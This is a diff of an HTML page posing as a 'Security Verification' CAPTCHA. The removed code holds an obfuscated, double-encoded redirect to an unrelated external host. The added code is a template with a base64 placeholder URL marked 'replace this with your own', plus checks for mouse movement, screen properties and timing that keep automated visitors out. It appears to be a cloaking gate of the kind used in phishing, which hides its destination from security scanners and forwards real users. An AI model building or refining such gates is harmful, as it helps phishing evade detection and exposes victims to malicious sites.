@@ -2,25 +2,26 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Verification Required</title>
+  <title>Security Check</title>
   <style>
     body {
-      font-family: sans-serif;
+      font-family: Arial, sans-serif;
       text-align: center;
       padding-top: 100px;
     }
-    input {
+    input, button {
+      font-size: 16px;
       padding: 10px;
-      font-size: 16px;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
+      margin-top: 10px;
     }
   </style>
   <script>
-    const redirectUrl = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vd29ya2luZ3dva2Vycy5mZW5tZW5vcy5kZS9iYzBRUCUyMiUyMC8lM0U=";
+    // Base64 encoded redirect URL (replace this with your own)
+    const encodedUrl = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==";
+
     let num1, num2;
+    let mouseMoved = false;
+    const startTime = Date.now();
 
     function isHumanLikeBrowser() {
       return (
@@ -28,9 +29,15 @@
         typeof window !== 'undefined' &&
         navigator.userAgent &&
         navigator.userAgent.length > 10 &&
-        window.innerWidth > 0 &&
-        window.innerHeight > 0
+        'language' in navigator &&
+        screen.width > 0 &&
+        screen.height > 0 &&
+        typeof window.DeviceOrientationEvent !== 'undefined'
       );
+    }
+
+    function hasMouseMovement() {
+      return mouseMoved;
     }
 
     function generateCaptcha() {
@@ -40,29 +47,39 @@
     }
 
     function verifyCaptcha() {
-      const answer = parseInt(document.getElementById("captcha-answer").value, 10);
-      const duration = Date.now() - window.startTime;
+      const userAnswer = parseInt(document.getElementById("captcha-answer").value, 10);
+      const elapsed = Date.now() - startTime;
 
-      if (isHumanLikeBrowser() && answer === (num1 + num2) && duration > 1000) {
-        window.location.href = redirectUrl;
+      if (
+        isHumanLikeBrowser() &&
+        hasMouseMovement() &&
+        userAnswer === (num1 + num2) &&
+        elapsed > 1500
+      ) {
+        const decodedUrl = atob(encodedUrl);
+        window.location.href = decodedUrl;
       } else {
-        alert("Bot protection triggered or wrong answer.");
-        generateCaptcha(); // Regenerate for next try
+        alert("Verification failed. Try again.");
+        generateCaptcha();
         document.getElementById("captcha-answer").value = "";
       }
     }
 
-    window.onload = () => {
-      window.startTime = Date.now();
+    function init() {
+      window.addEventListener("mousemove", () => {
+        mouseMoved = true;
+      });
       generateCaptcha();
-    };
+    }
+
+    window.onload = init;
   </script>
 </head>
 <body>
-  <h2>Verify You Are Human</h2>
+  <h2>Security Verification</h2>
   <p id="captcha-question"></p>
-  <input type="number" id="captcha-answer" placeholder="Enter your answer" />
-  <br><br>
-  <button onclick="verifyCaptcha()">Submit</button>
+  <input type="number" id="captcha-answer" placeholder="Your answer">
+  <br>
+  <button onclick="verifyCaptcha()">Verify & Continue</button>
 </body>
 </html>
